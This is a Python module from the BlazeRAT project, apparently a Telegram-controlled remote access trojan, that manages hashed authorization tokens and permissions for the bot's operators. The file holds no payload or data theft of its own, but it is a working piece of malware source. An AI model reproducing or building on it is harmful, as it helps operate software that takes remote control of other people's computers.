#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from uuid import uuid4
from config import perms
from hashlib import sha512
from json import loads, dumps
from services.startup import CURRENT_DIRECTORY
from core.database import connection, cursor, lock

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to work with authorization tokens.
"""

# Write telegram bot api token
def WriteTelegramBotAPI_Token(token: str) -> None:
    with open(CURRENT_DIRECTORY + "/token.txt", "w") as api_token:
        api_token.write(token)

# Verify token
def VerifyToken(token: str) -> tuple:
    sql = "SELECT name FROM tokens WHERE token=?"
    hsh = TokenToHash(token)
    cursor.execute(sql, (hsh,))
    result = cursor.fetchone()
    if result is not None:
        return True, result[0]
    else:
        return False, "Unknown"

# Convert token to hash
def TokenToHash(token: str) -> str:
    return sha512(b"TOKEN:" + token.encode()).hexdigest()

""" List permissions """
def EnumeratePermissions(token_name: str, have=True, console=True) -> str:
    result = f"Token '{token_name}' have permissions:\n\n" if have else f"All permissions for token '{token_name}'\n\n"
    # Emoji
    if console is True:
        y, n = "[+]", "[-]"
    else:
        y, n = "✅", "⛔"
    # Enum
    for permission in perms.keys():
        description = perms[permission]
        if TokenContainsPermission(token_name, permission):
            result += f"{y} {permission} - {description}\n"
        else:
            if not have:
                result += f"{n} {permission} - {description}\n"
    return result


""" Check if token have permission """
def TokenContainsPermission(token_name: str, permission: str) -> bool:
    sql = "SELECT permissions FROM tokens WHERE name=?"
    cursor.execute(sql, (token_name,))
    result = cursor.fetchone()
    # Check if token exists
    if not result:
        return False
    # Check root perms
    if result[0] == "*":
        return True
    # Check other perms
    else:
        return permission in loads(result[0])

""" Create token with permissions """
def TokenCreate(name: str, permissions: list) -> str:
    lock.acquire(True)
    token = uuid4().urn[9:]
    # Create new token
    sql = "INSERT INTO tokens (token, name, permissions) VALUES (?, ?, ?)"
    hsh = TokenToHash(token)
    # Get permissions
    if "*" in permissions:
        perms = "*"
    else:
        perms = dumps(permissions)
    # Execute sql & commit changes
    cursor.execute(sql, (hsh, name, perms))
    # Done
    connection.commit()
    lock.release()
    return token

""" Delete token """
def TokenDelete(name: str) -> bool:
    # Check if token exists
    sql = "SELECT id FROM tokens WHERE name=?"
    cursor.execute(sql, (name,))
    result = cursor.fetchone()
    # Delete token
    if result is not None:
        lock.acquire(True)
        sql = "DELETE FROM tokens WHERE id=?"
        cursor.execute(sql, (result[0],))
        connection.commit()
        lock.release()
        return True
    else:
        return False
